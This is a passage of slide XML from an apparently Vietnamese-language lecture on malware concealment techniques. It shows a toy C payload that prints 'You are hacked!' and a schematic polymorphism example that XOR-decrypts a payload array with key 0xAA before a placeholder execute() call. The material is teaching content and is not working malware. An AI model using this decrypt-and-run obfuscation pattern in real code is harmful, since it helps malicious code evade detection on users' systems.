                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thông điệp cảnh báo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>You are hacked!\n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29458717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993353"/>
            <a:ext cx="10324532"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Kỹ thuật che giấu Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví</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dụ</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về</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Polymorphism</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2</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Phiên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bản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lây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lan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> 1 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>mã</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hóa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> payload + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>giải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mã</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bằng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XOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> key=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0xAA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>unsigned </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>char </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>encrypted_payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>= {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0xFB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0xD7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0xC2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>, ...}; </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="50000"/>
                  <a:lumOff val="50000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>decrypt_and_run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> 0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> &lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>sizeof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>encrypted_payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>++) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>encrypted_payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>] ^= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>0xAA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>;  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>			</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>giải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>mã</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="50000"/>
                  <a:lumOff val="50000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>execute(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>encrypted_payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Bookman Old Style" panose="02050604050505020204" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>);       </a:t>
            </a:r>
            <a:r>
